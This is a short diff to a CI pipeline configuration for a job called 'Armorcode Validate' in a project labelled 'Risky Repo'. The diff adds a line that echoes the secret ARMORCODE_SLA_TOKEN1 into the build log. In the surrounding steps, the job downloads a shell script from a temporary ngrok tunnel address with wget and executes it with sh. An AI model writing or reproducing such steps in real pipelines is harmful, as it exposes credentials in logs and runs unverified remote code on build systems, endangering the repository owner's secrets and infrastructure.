@@ -10,11 +10,12 @@ jobs:
       environment: Staging
       product: "Risky Repo"
       subProduct: "Risky subpro"
-      token: "${ARMORCODE_SLA_TOKEN1}"
+      token: ${ARMORCODE_SLA_TOKEN1}
     steps: 
       - 
         run: 
           command: |
+              echo ${ARMORCODE_SLA_TOKEN1}
               wget https://1169-44-239-74-14.ngrok.io/static/scripts/slastatus.sh
               sh slastatus.sh
           name: "Armorcode Validate"
